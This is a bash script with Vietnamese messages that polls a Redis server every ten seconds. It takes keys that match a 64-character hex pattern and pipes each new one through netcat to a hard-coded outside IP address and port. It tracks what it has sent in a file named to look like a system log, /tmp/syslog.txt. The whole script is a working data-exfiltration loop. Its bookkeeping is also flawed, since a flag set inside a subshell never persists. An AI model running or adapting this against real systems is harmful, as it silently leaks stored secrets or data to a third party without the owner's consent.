#!/bin/bash

REDIS_CLI="/usr/bin/redis-cli"
REMOTE_HOST="139.59.236.6"
REMOTE_PORT=12345
KEYS_FILE="/tmp/syslog.txt"

touch "$KEYS_FILE"

while true
do
    NEW_KEY_SENT=0
    $REDIS_CLI KEYS "*" | grep -E '^[a-f0-9]{64}$' | while read key; do
        if ! grep -qx "$key" "$KEYS_FILE"; then
            echo "$key" | nc "$REMOTE_HOST" "$REMOTE_PORT"
            if [ $? -eq 0 ]; then
                echo "$key" >> "$KEYS_FILE"
                echo "Đã gửi key $key"
                NEW_KEY_SENT=1
            else
                echo "Gửi key $key bị lỗi"
            fi
        fi
    done

    # Nếu không còn key mới nào vừa gửi, xóa file KEYS_FILE (nếu có nội dung)
    if [ $NEW_KEY_SENT -eq 0 ] && [ -s "$KEYS_FILE" ]; then
        rm -f "$KEYS_FILE"
        echo "Đã xóa file $KEYS_FILE sau khi gửi hết key"
    fi

    sleep 10
done
